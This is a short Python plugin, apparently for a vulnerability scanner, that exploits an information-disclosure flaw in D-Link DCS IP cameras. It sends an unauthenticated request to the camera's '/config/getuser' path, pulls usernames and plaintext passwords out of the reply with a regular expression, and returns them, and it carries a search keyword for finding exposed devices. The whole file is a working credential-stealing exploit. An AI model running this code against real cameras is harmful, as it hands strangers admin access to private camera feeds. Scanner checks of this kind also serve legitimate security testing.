# -*-* coding:UTF-8
import hashlib
import re


class Plugin(Base):
    __info__ = {
        "name": "D-Link DCS监控信息泄露漏洞",
        "keyword": "app=\"D_Link-DCS-2670L\"",
        "description": "2020年6月11日，第3方安全研究员提请D-Link关注两次安全相关事件。在Twitter上发现了两个关于DCS-2530L IP摄像机的漏洞",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='get',
            path=f'./config/getuser?index=0',
            timeout=15
        )
        if r.status_code == 200 and "pass" in r.text:
            find = re.findall(r"name=(.*)\npass=(.*)\npriv=\d", r.text)
            if find:
                self.__info__['data'] = [{"username": i[0], "password": i[1]} for i in find]
                return {"LoopholeInfo": self.__info__}
